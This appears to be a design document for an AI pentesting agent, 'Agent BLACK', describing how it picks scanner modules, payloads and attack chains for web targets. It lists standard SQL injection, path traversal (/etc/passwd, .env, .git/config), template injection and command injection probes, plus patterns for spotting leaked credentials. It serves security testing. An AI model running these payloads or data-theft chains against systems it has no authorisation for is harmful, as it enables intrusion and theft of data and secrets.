# Agent BLACK Decision Engine

This document defines exactly how I make decisions about what to scan,
which tools to use, what payloads to try, and how to analyze results.

---

## 1. MODULE SELECTION LOGIC

When given a target, I select modules using a weighted scoring system.

### Base Scoring (Default Modules = 10 points)

```
fingerprint, headers, cors, ssl, secrets → 10 points each
```

### Target Profile Bonus (+50 points)

If I've scanned this target before and found vulnerabilities:
```python
for module in profile.vulnerable_modules:
    scored_modules[module] += 50
```

### Technology Stack Mapping (+20 points per match)

```
Flask       → ssti, lfi, cmdi
Django      → ssti, csrf, idor
Express     → prototype, xss, ssrf
PHP         → lfi, sqli, upload
Java        → deserial, xxe, sqli
ASP.NET     → sqli, xss, upload
WordPress   → sqli, upload, xss
GraphQL     → graphql, idor, auth
JWT         → jwt, auth, session
```

### Historical Effectiveness Bonus (variable)

```python
bonus = avg_score * 0.1 + exploit_success_rate * 30
```

### Final Module Selection

Modules sorted by total score, highest first. Top modules used for scan.

---

## 2. PAYLOAD SELECTION LOGIC

I don't just use static payload lists. I prioritize based on what worked before.

### Payload Scoring Formula

```python
score = success_count * 10

for tech in target_tech_stack:
    if tech in payload_known_tech_stacks:
        score += 20

if payload_severity == "CRITICAL":
    score += 50
elif payload_severity == "HIGH":
    score += 30
```

### Example: SQL Injection Payloads

When attacking Flask/SQLite:
```
Priority 1: Payloads that worked on Flask before
Priority 2: Payloads that found CRITICAL vulns
Priority 3: General SQLi payloads from sqli.txt
```

### Payload Files Available

```
payloads/sqli.txt         → Basic SQL injection
payloads/sqli_advanced.txt → Complex/bypass payloads
payloads/xss.txt          → XSS vectors
payloads/xss_advanced.txt → Filter bypass XSS
payloads/xss_master.txt   → Complete XSS arsenal
payloads/lfi.txt          → Path traversal
payloads/ssti.txt         → Template injection
payloads/ssrf.txt         → SSRF with bypass
payloads/cmdi.txt         → Command injection
payloads/xxe.txt          → XXE payloads
payloads/crlf.txt         → Header injection
payloads/redirect.txt     → Open redirect
```

---

## 3. ATTACK CHAIN SELECTION

I have predefined attack chains for different objectives.

### Available Chains

| Chain | Objective | Modules |
|-------|-----------|---------|
| `auth_bypass` | Bypass authentication | waf, sqli, ldap, auth, jwt, oauth, mfa, session |
| `data_theft` | Extract data | waf, sqli, ssrf, lfi, xxe, idor, disclosure, dirbust, cloud |
| `rce` | Remote code execution | waf, cmdi, ssti, deserial, upload, ssrf |
| `xss_chain` | Client-side attacks | waf, csp, xss, dom, prototype, cors, csrf |
| `api_attack` | API exploitation | waf, api, graphql, massassign, jwt, idor |
| `enum` | Enumeration | waf, dirbust, subdomain, takeover, disclosure, fingerprint |
| `injection` | All injection types | waf, paramfind, sqli, xss, ssti, cmdi, lfi, xxe, crlf |

### Chain Selection Logic

```
User says "get me data from this server"
→ Map to data_theft chain
→ Execute: waf → sqli → ssrf → lfi → xxe → idor...

User says "bypass the login"
→ Map to auth_bypass chain
→ Execute: waf → sqli → ldap → auth → jwt...
```

---

## 4. SCAN VARIATION SYSTEM

When repeated scans don't find new results, I vary my approach.

### Variation Sets (Rotated on Each Scan)

```
Scan 1: Base modules (user requested)
Scan 2: All injection + cookie + headers
Scan 3: All recon + all auth modules
Scan 4: All injection + advanced (graphql, deserial, race...)
Scan 5: Everything (injection + recon + auth)
```

### Flag Variation (Per Scan)

```
Scan 1: []                           (normal)
Scan 2: [--aggressive]               (more payloads)
Scan 3: [--crawl, --crawl-depth 3]   (discover endpoints)
Scan 4: [--deep, --aggressive]       (thorough)
Scan 5: [--exploit, --aggressive, --crawl]  (full attack)
```

### When To Vary

```python
def should_try_new_approach(target):
    if scan_count > 1 and flags_found < 5:
        return True  # Keep trying new approaches
    return False
```

---

## 5. SMART PROBE SYSTEM

When LANTERN misses vulnerabilities, I probe manually.

### Probe Payloads Per Type

**SQL Injection:**
```
' OR '1'='1
' OR 1=1--
1' ORDER BY 1--
1 UNION SELECT NULL--
admin'--
```

**LFI:**
```
../etc/passwd
....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
../.env
../.git/config
```

**SSTI:**
```
{{7*7}}
{{config}}
{{self.__class__}}
${T(java.lang.Runtime).getRuntime()}
```

**Command Injection:**
```
; id
| id
`id`
$(id)
; cat /etc/passwd
```

### Success Detection Patterns

```python
sqli_indicators = [r"syntax error", r"mysql", r"sqlite", r"ORA-\d+"]
lfi_indicators = [r"root:.*:0:0", r"DB_PASSWORD", r"API_KEY"]
ssti_indicators = [r"^49$", r"<Config", r"__class__"]
cmdi_indicators = [r"uid=\d+", r"root:.*:0:0", r"gid=\d+"]
```

---

## 6. FINDING ANALYSIS LOGIC

How I calculate risk and prioritize findings.

### Risk Score Formula

```python
risk_score = (
    CRITICAL_count * 10 +
    HIGH_count * 5 +
    MEDIUM_count * 2 +
    LOW_count * 1
)
```

### Risk Level Mapping

```
risk_score >= 50  → CRITICAL  → "Immediate remediation required"
risk_score >= 20  → HIGH      → "High priority fixes needed"
risk_score >= 10  → MEDIUM    → "Address in next sprint"
risk_score < 10   → LOW       → "Good security posture"
```

### Attack Chain Detection

If multiple related findings exist, I flag potential attack chains:
```python
for chain_name, chain_modules in attack_chains.items():
    matched = sum(1 for m in chain_modules if m in findings)
    if matched >= 2:
        chains_detected.append(chain_name)
```

---

## 7. REPORT GENERATION

LANTERN generates reports in multiple formats.

### Report Formats

| Format | Use Case |
|--------|----------|
| HTML | Visual report with styling, PoCs, screenshots |
| JSON | Machine-readable, API consumption |
| Markdown | Documentation, wiki integration |
| SARIF | IDE/GitHub security integration |
| JIRA CSV | Import directly to JIRA tickets |

### Report Contents

Each finding includes:
- Severity (CRITICAL/HIGH/MEDIUM/LOW/INFO)
- CVSS Score (calculated per module)
- Module that found it
- URL and parameter
- Evidence
- PoC (curl command, Python code)
- Remediation steps with code examples

### CVSS Scores Per Module

```python
sqli     → 9.8  (RCE potential)
cmdi     → 9.8  (Direct RCE)
ssti     → 9.8  (Template RCE)
deserial → 9.8  (Object RCE)
upload   → 9.8  (Webshell)
takeover → 9.8  (Full control)
ssrf     → 9.1  (Internal access)
xxe      → 7.5  (File read)
lfi      → 7.5  (File read)
jwt      → 7.5  (Auth bypass)
xss      → 6.1  (Client-side)
idor     → 6.5  (Data access)
cors     → 5.3  (Info leak)
```

---

## 8. IMPROVEMENT SUGGESTION LOGIC

When I find something LANTERN missed, I generate patches.

### Improvement Pipeline

```
1. Smart Probe finds vuln LANTERN missed
2. Record payload that worked
3. Record detection pattern that matched
4. Generate module patch code
5. Save to lantern_patches/
6. Create PATCH_SUMMARY.md
```

### Patch Code Generation

For each finding type, I generate appropriate code:

**SQLi Module Improvement:**
```python
FLASK_SQLI_PAYLOADS = [
    "' OR '1'='1",
    "admin'--",
]

FLASK_SQLITE_ERRORS = [
    r"sqlite3\.OperationalError",
    r"near.*syntax",
]
```

**SSTI Module Improvement:**
```python
JINJA2_PAYLOADS = [
    "{{7*7}}",
    "{{config}}",
]

JINJA2_INDICATORS = [
    r"^49$",
    r"<Config",
]
```

---

## 9. NATURAL LANGUAGE → LANTERN COMMAND

How I translate requests to commands.

### Keyword → Module Mapping

```
"sql", "injection", "database"  → sqli
"xss", "script", "cross-site"   → xss
"file", "path", "traversal"     → lfi
"template", "jinja"             → ssti
"command", "rce", "shell"       → cmdi
"api", "rest", "endpoint"       → api
"auth", "login", "password"     → auth
"upload", "file upload"         → upload
```

### Preset Mapping

```
"full", "comprehensive", "thorough" → --preset thorough
"fast", "quick"                     → --preset fast
"stealth", "quiet"                  → --preset stealth
"exploit", "attack"                 → --preset exploit --chain
```

### URL Extraction

```python
url_pattern = r'https?://[^\s]+'
target = re.findall(url_pattern, message)[0]
```

### Example Translation

```
Input:  "Do a thorough SQL injection test on https://target.com"
Output: lantern -t https://target.com --preset thorough -m sqli,sqli_advanced
```

---

## 10. LEARNING PERSISTENCE

What I remember between scans.

### Files Stored

```
learned/target_profiles.json     → Per-target history
learned/successful_payloads.json → Payloads that worked
learned/scan_history.json        → All past scans
learned/module_effectiveness.json → Module performance
```

### Target Profile Structure

```json
{
  "signature": "https://target.com",
  "first_seen": "2026-01-15T00:00:00Z",
  "scan_count": 5,
  "tech_stack": ["Flask", "SQLite"],
  "vulnerable_modules": ["sqli", "ssti"],
  "working_payloads": ["' OR '1'='1", "{{7*7}}"],
  "total_findings": {"CRITICAL": 2, "HIGH": 3},
  "flags_captured": ["FLAG{...}"]
}
```

### Module Effectiveness Structure

```json
{
  "sqli": {
    "times_used": 50,
    "total_score": 2500,
    "exploit_success": 15,
    "avg_score": 50.0
  }
}
```

This data feeds back into module selection for future scans.
